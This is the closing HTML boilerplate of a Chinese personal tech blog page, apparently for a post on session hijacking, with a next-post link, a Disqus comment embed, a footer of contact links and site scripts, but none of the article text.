        <p><strong>下一篇</strong> <a href="/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/">cookie窃取和session劫持-WEB前端开发</a></p>
        
    </div>
</div>


        <h2 id="comments">Comments</h2>
        


<div id="disqus_thread"></div>
<script>
    /**
     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function() {
        this.page.url = 'https://tldsn.github.io/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/'; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'https://tldsn.github.io/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };

    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//https-tldsn-github-io.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <li><a href="#comments">Comments</a></li>
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/assets/js/pageContent.js " charset="utf-8"></script>


  <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
            
        </p>
        <p class="contact">
            Contact me at: 
            <a href="https://github.com/tldsn" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=742720531@qq.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>  
            <a href="http://weibo.com/5578237033" title="Weibo"><i class="fa fa-weibo" aria-hidden="true"></i></a>  
            <a href="https://www.zhihu.com/people/yao-yu-jie-90" title="Zhihu"><i class="iconfont blog-zhihu"></i></a>  
            <a href="https://www.douban.com/people/122400251" title="Douban"><i class="iconfont blog-douban"></i></a>  
            <a href="https://music.163.com/#/user/home?id=263386850" title="Cloudmusic"><i class="iconfont blog-yinle"></i></a>  
             
               
            
        </p>
        <p class="busuanzi">
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://pages.github.com/">Github Pages</a>.
            </span>
            <span>
                Theme designed by <a href="https://github.com/Gaohaoyang">HyG</a>.
            </span>
        </p>
    </div>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

  <div id="music"></div>

  <!-- 加载 cplayer 脚本 -->
  <!-- <script src="https://cdn.jsdelivr.net/npm/cplayer/dist/cplayer.min.js"></script>
  <script>
    let player = new cplayer({
      element: document.getElementById('music'),
      playlist: [
      ]
    })

    cplayer.prototype.add163 = function add163(id) {
      if (!id) throw new Error("Unable Property.");
      return fetch("https://music.huaji8.top/?id=" + id).then(function (res) { return res.json() }).then(function (data) {
        let obj = {
          name: data.info.songs[0].name,
          artist: data.info.songs[0].ar.map(function (ar) { return ar.name }).join(','),
          poster: data.pic.url,
          lyric: data.lyric.lyric,
          sublyric: data.lyric.tlyric,
          src: data.url.url,
          album: data.info.songs[0].al.name
        }
        this.add(obj);
        return obj;
      }.bind(this))
    }
    player.add163(263386850)
  </script> -->
  <script src=" /assets/js/main.js " charset="utf-8"></script>
  <script src=" /assets/js/smooth-scroll.min.js " charset="utf-8"></script>
  <script type="text/javascript">
    smoothScroll.init({
      speed: 500, // Integer. How fast to complete the scroll in milliseconds
      easing: 'easeInOutCubic', // Easing pattern to use
      offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
    });
  </script>
  <!-- <script src=" /assets/js/scroll.min.js " charset="utf-8"></script> -->
</body>

</html>